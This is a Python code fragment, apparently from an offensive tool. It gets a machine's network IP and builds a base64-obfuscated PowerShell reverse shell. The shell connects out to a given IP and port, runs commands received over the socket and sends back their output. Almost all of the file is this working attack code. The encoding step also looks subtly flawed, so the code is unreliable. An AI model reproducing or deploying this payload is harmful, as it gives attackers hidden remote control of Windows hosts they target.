def get_ip_address(interface):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ip_address = socket.inet_ntoa(fcntl.ioctl(
            s.fileno(),
            0x8915,  # SIOCGIFADDR
            struct.pack('256s', interface[:15].encode())
        )[20:24])
        return ip_address
    except Exception as e:
        return str(e)

def powershell_base64_payload(ip, port):
    plaintext_payload_template = "powershell -e $client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

    plaintext_payload = plaintext_payload_template.replace("{ip}", str(ip)).replace("{port}", str(port))

    payload_index = plaintext_payload.find("powershell -e ")

    prefix = plaintext_payload[:payload_index + len("powershell -e ")]
    suffix = plaintext_payload[payload_index + len("powershell -e "):]

    encoded_suffix = base64.b64encode(suffix.encode()).decode()

    powershell_3_base64 = "[NO_DECODE]" + prefix + encoded_suffix

    return powershell_3_base64

